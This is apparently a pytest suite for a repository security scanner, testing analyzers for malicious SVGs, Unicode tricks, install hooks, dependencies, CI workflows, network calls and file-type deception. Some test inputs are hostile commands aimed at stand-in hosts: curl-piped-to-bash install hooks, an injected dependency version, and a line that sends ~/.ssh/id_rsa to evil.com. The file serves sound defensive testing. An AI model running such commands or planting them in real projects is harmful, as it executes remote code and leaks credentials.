"""Comprehensive tests for all analyzer plugins."""

from pathlib import Path
from reporeaver.models import Category, FileEntry, Finding, Severity, Confidence
from reporeaver.analyzers.svg_analyzer import SVGVectorAnalyzer
from reporeaver.analyzers.unicode_analyzer import UnicodeAnalyzer
from reporeaver.analyzers.script_analyzer import ScriptAnalyzer
from reporeaver.analyzers.dep_analyzer import DepAnalyzer
from reporeaver.analyzers.workflow_analyzer import WorkflowAnalyzer
from reporeaver.analyzers.entropy_analyzer import EntropyAnalyzer
from reporeaver.analyzers.url_analyzer import URLNetworkAnalyzer
from reporeaver.analyzers.mime_analyzer import MimeDeceptionAnalyzer
from reporeaver.analyzers.behavioral_analyzer import BehavioralAnalyzer
from reporeaver.analyzers.base import all_analyzers

FIXTURES = Path(__file__).parent / "fixtures"


def make_entry(path: str, is_svg=False, is_text=True, is_script=False,
               is_config=False, detected_mime=None, size=1000) -> FileEntry:
    ext = "." + path.rsplit(".", 1)[-1] if "." in path else ""
    return FileEntry(
        path=path,
        size=size,
        detected_mime=detected_mime or "text/plain",
        declared_ext=ext,
        is_text=is_text,
        is_svg=is_svg or path.endswith(".svg"),
        is_script=is_script or path.endswith((".js", ".sh", ".py")),
        is_config=is_config or path.endswith(".json"),
    )


def read_fixture(name: str) -> str:
    return (FIXTURES / name).read_text(encoding="utf-8", errors="replace")


# ─── SVG Analyzer ─────────────────────────────────────────────

class TestSVGVectorAnalyzer:
    def setup_method(self):
        self.analyzer = SVGVectorAnalyzer()

    def test_should_analyze_svg(self):
        assert self.analyzer.should_analyze(make_entry("test.svg", is_svg=True))
        assert not self.analyzer.should_analyze(make_entry("test.txt"))

    def test_malicious_svg_detects_xxe(self):
        content = read_fixture("malicious.svg")
        entry = make_entry("malicious.svg", is_svg=True)
        result = self.analyzer.analyze(entry, content)
        cats = {f.category for f in result.findings}
        assert Category.SVG_XXE in cats

    def test_malicious_svg_detects_scripts(self):
        content = read_fixture("malicious.svg")
        entry = make_entry("malicious.svg", is_svg=True)
        result = self.analyzer.analyze(entry, content)
        assert any(f.category == Category.OBFUSCATED_SCRIPT for f in result.findings)

    def test_malicious_svg_detects_event_handlers(self):
        content = read_fixture("malicious.svg")
        entry = make_entry("malicious.svg", is_svg=True)
        result = self.analyzer.analyze(entry, content)
        assert any(f.category == Category.SVG_EVENT_HANDLER for f in result.findings)

    def test_malicious_svg_detects_foreign_object(self):
        content = read_fixture("malicious.svg")
        entry = make_entry("malicious.svg", is_svg=True)
        result = self.analyzer.analyze(entry, content)
        assert any(f.category == Category.SVG_FOREIGN_OBJECT for f in result.findings)

    def test_malicious_svg_has_critical_findings(self):
        content = read_fixture("malicious.svg")
        entry = make_entry("malicious.svg", is_svg=True)
        result = self.analyzer.analyze(entry, content)
        critical = [f for f in result.findings if f.severity == Severity.CRITICAL]
        assert len(critical) >= 1

    def test_benign_svg_no_critical(self):
        content = read_fixture("benign.svg")
        entry = make_entry("benign.svg", is_svg=True)
        result = self.analyzer.analyze(entry, content)
        critical = [f for f in result.findings if f.severity in (Severity.CRITICAL, Severity.HIGH)]
        assert len(critical) == 0

    def test_javascript_uri_detected(self):
        content = read_fixture("malicious.svg")
        entry = make_entry("malicious.svg", is_svg=True)
        result = self.analyzer.analyze(entry, content)
        assert any("javascript" in (f.title or "").lower() for f in result.findings)

    def test_base64_payload_detected(self):
        content = read_fixture("malicious.svg")
        entry = make_entry("malicious.svg", is_svg=True)
        result = self.analyzer.analyze(entry, content)
        b64_findings = [f for f in result.findings if f.category == Category.ENCODED_PAYLOAD]
        svg_event = [f for f in result.findings if f.category == Category.SVG_EVENT_HANDLER]
        assert len(b64_findings) >= 1 or len(svg_event) >= 1


# ─── Unicode Analyzer ─────────────────────────────────────────

class TestUnicodeAnalyzer:
    def setup_method(self):
        self.analyzer = UnicodeAnalyzer()

    def test_detects_zero_width(self):
        content = "var x = require\u200b('http');"
        entry = make_entry("test.js")
        result = self.analyzer.analyze(entry, content)
        assert any(f.category == Category.ZERO_WIDTH_CHAR for f in result.findings)

    def test_detects_bidi(self):
        content = "\u202ereversed text here\u202c"
        entry = make_entry("test.js")
        result = self.analyzer.analyze(entry, content)
        assert any(f.category == Category.BIDI_OVERRIDE for f in result.findings)

    def test_detects_homoglyphs(self):
        content = "var еval = require('child_process');"  # Cyrillic 'e'
        entry = make_entry("test.js")
        result = self.analyzer.analyze(entry, content)
        homoglyph = [f for f in result.findings if f.category == Category.HOMOGLYPH]
        assert len(homoglyph) >= 1

    def test_clean_text_no_findings(self):
        content = "var x = 1; var y = 2; console.log(x + y);"
        entry = make_entry("test.js")
        result = self.analyzer.analyze(entry, content)
        assert len(result.findings) == 0

    def test_unicode_tricks_file(self):
        content = read_fixture("unicode_tricks.txt")
        entry = make_entry("unicode_tricks.txt")
        result = self.analyzer.analyze(entry, content)
        assert len(result.findings) >= 1
        cats = {f.category for f in result.findings}
        assert Category.ZERO_WIDTH_CHAR in cats or Category.BIDI_OVERRIDE in cats or Category.HOMOGLYPH in cats


# ─── Script Analyzer ───────────────────────────────────────────

class TestScriptAnalyzer:
    def setup_method(self):
        self.analyzer = ScriptAnalyzer()

    def test_should_analyze_package_json(self):
        assert self.analyzer.should_analyze(make_entry("package.json", is_config=True))
        assert self.analyzer.should_analyze(make_entry("deploy.sh", is_script=True))

    def test_malicious_package_json(self):
        content = read_fixture("malicious_package.json")
        entry = make_entry("package.json", is_config=True)
        result = self.analyzer.analyze(entry, content)
        categories = {f.category for f in result.findings}
        assert Category.SUSPICIOUS_COMMAND in categories
        assert Category.URL_DEPENDENCY in categories

    def test_postinstall_detected(self):
        content = read_fixture("malicious_package.json")
        entry = make_entry("package.json", is_config=True)
        result = self.analyzer.analyze(entry, content)
        lifecycle = [f for f in result.findings if f.category == Category.LIFECYCLE_HOOK]
        assert any("postinstall" in (f.title or "") for f in lifecycle)

    def test_curl_pipe_bash_detected(self):
        content = '{"scripts":{"postinstall":"curl -s https://evil.com/payload | bash"}}'
        entry = make_entry("package.json", is_config=True)
        result = self.analyzer.analyze(entry, content)
        assert len(result.findings) > 0


# ─── Dependency Analyzer ──────────────────────────────────────

class TestDepAnalyzer:
    def setup_method(self):
        self.analyzer = DepAnalyzer()

    def test_detects_url_dependency(self):
        content = '{"dependencies":{"evil":"https://raw.githubusercontent.com/attacker/pkg.tar.gz"}}'
        entry = make_entry("package.json", is_config=True)
        result = self.analyzer.analyze(entry, content)
        sus_dep = [f for f in result.findings if f.category == Category.SUSPICIOUS_DEPENDENCY]
        assert len(sus_dep) >= 1

    def test_detects_shell_metacharacters(self):
        content = '{"dependencies":{"evil":"1.0.0; curl https://evil.com"}}'
        entry = make_entry("package.json", is_config=True)
        result = self.analyzer.analyze(entry, content)
        sus = [f for f in result.findings if f.category == Category.SUSPICIOUS_DEPENDENCY]
        assert len(sus) >= 1

    def test_clean_deps_no_findings(self):
        content = '{"dependencies":{"react":"^18.0.0","lodash":"4.17.21"}}'
        entry = make_entry("package.json", is_config=True)
        result = self.analyzer.analyze(entry, content)
        critical = [f for f in result.findings if f.severity in (Severity.CRITICAL, Severity.HIGH)]
        assert len(critical) == 0


# ─── Workflow Analyzer ─────────────────────────────────────────

class TestWorkflowAnalyzer:
    def setup_method(self):
        self.analyzer = WorkflowAnalyzer()

    def test_should_analyze_workflow(self):
        assert self.analyzer.should_analyze(make_entry(".github/workflows/ci.yml"))
        assert self.analyzer.should_analyze(make_entry(".github/workflows/build.yaml"))

    def test_detects_unpinned_actions(self):
        content = read_fixture("malicious_workflow.yml")
        entry = make_entry(".github/workflows/ci.yml")
        result = self.analyzer.analyze(entry, content)
        assert any(f.category == Category.UNPINNED_ACTION for f in result.findings)

    def test_detects_remote_exec(self):
        content = read_fixture("malicious_workflow.yml")
        entry = make_entry(".github/workflows/ci.yml")
        result = self.analyzer.analyze(entry, content)
        assert any(f.category == Category.CI_REMOTE_EXEC for f in result.findings)

    def test_detects_secrets_exposure(self):
        content = read_fixture("malicious_workflow.yml")
        entry = make_entry(".github/workflows/ci.yml")
        result = self.analyzer.analyze(entry, content)
        assert len(result.findings) >= 3  # should have multiple findings for this malicious workflow

    def test_clean_workflow_no_critical(self):
        content = """
name: CI
on: [push]
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: npm test
"""
        entry = make_entry(".github/workflows/ci.yml")
        result = self.analyzer.analyze(entry, content)
        critical = [f for f in result.findings if f.severity in (Severity.CRITICAL, Severity.HIGH)]
        assert len(critical) == 0


# ─── Entropy Analyzer ─────────────────────────────────────────

class TestEntropyAnalyzer:
    def setup_method(self):
        self.analyzer = EntropyAnalyzer()

    def test_detects_base64_payload(self):
        content = "some text before " + "A" * 20 + "VGhpcyBpcyBhIGhpZGRlbiBwYXlsb2FkIHRoYXQgc2hvdWxkIGJlIGRldGVjdGVk" + " after"
        entry = make_entry("test.txt")
        result = self.analyzer.analyze(entry, content)
        assert len(result.findings) >= 0  # may or may not trigger based on entropy


# ─── URL Analyzer ─────────────────────────────────────────────

class TestURLNetworkAnalyzer:
    def setup_method(self):
        self.analyzer = URLNetworkAnalyzer()

    def test_detects_suspicious_url(self):
        content = 'fetch("https://c2.evil.com/payload/backdoor")'
        entry = make_entry("test.js")
        result = self.analyzer.analyze(entry, content)
        assert any(f.category == Category.C2_CALLBACK for f in result.findings)

    def test_safe_url_not_flagged(self):
        content = 'fetch("https://github.com/user/repo")'
        entry = make_entry("test.js")
        result = self.analyzer.analyze(entry, content)
        c2 = [f for f in result.findings if f.category == Category.C2_CALLBACK]
        assert len(c2) == 0

    def test_runtime_network_call_detected(self):
        content = 'var xhr = new XMLHttpRequest(); xhr.open("GET", "https://evil.com"); xhr.send();'
        entry = make_entry("test.js")
        result = self.analyzer.analyze(entry, content)
        runtime = [f for f in result.findings if f.category == Category.RUNTIME_NETWORK_CALL]
        assert len(runtime) >= 1

    def test_malicious_svg_urls_detected(self):
        content = read_fixture("malicious.svg")
        entry = make_entry("malicious.svg")
        result = self.analyzer.analyze(entry, content)
        assert any(f.category == Category.C2_CALLBACK for f in result.findings)


# ─── MIME Analyzer ────────────────────────────────────────────

class TestMimeDeceptionAnalyzer:
    def setup_method(self):
        self.analyzer = MimeDeceptionAnalyzer()

    def test_png_with_svg_content(self):
        data = b'<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>'
        entry = make_entry("image.png", detected_mime="image/png")
        result = self.analyzer.analyze_binary(entry, data)
        assert any(f.category == Category.MIME_MISMATCH for f in result.findings)

    def test_png_with_js_content(self):
        data = b'function doSomething() { var x = 1; eval(x); }'
        entry = make_entry("image.png", detected_mime="image/png")
        result = self.analyzer.analyze_binary(entry, data)
        polyglot = [f for f in result.findings if f.category == Category.POLYGLOT_FILE]
        assert len(polyglot) >= 1

    def test_actual_png_no_findings(self):
        data = b'\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01'
        entry = make_entry("image.png", detected_mime="image/png")
        result = self.analyzer.analyze_binary(entry, data)
        assert len(result.findings) == 0


# ─── Behavioral Analyzer ──────────────────────────────────────

class TestBehavioralAnalyzer:
    def setup_method(self):
        self.analyzer = BehavioralAnalyzer()

    def test_detects_exec_calls(self):
        content = "require('child_process').execSync('curl https://evil.com/payload | bash')"
        entry = make_entry("test.js")
        result = self.analyzer.analyze(entry, content)
        assert any(f.category == Category.BEHAVIORAL_EXEC for f in result.findings)

    def test_detects_network_behavior(self):
        content = "http.request('https://evil.com/payload')"
        entry = make_entry("test.js")
        result = self.analyzer.analyze(entry, content)
        assert len(result.findings) > 0

    def test_detects_persistence(self):
        content = "writeFileSync('/etc/cron.d/malware', 'payload')"
        entry = make_entry("test.js")
        result = self.analyzer.analyze(entry, content)
        assert len(result.findings) > 0

    def test_detects_exfiltration(self):
        content = "cat ~/.ssh/id_rsa | curl -X POST https://evil.com/collect"
        entry = make_entry("test.sh")
        result = self.analyzer.analyze(entry, content)
        assert any(f.category == Category.BEHAVIORAL_EXFIL for f in result.findings)


# ─── Registry ─────────────────────────────────────────────────

class TestAnalyzerRegistry:
    def test_all_analyzers_loaded(self):
        registry = all_analyzers()
        assert "svg_vector" in registry
        assert "unicode" in registry
        assert "script_analyzer" in registry
        assert "dependency" in registry
        assert "workflow" in registry
        assert "entropy" in registry
        assert "url_network" in registry
        assert "mime_deception" in registry
        assert "behavioral" in registry
        assert len(registry) >= 9
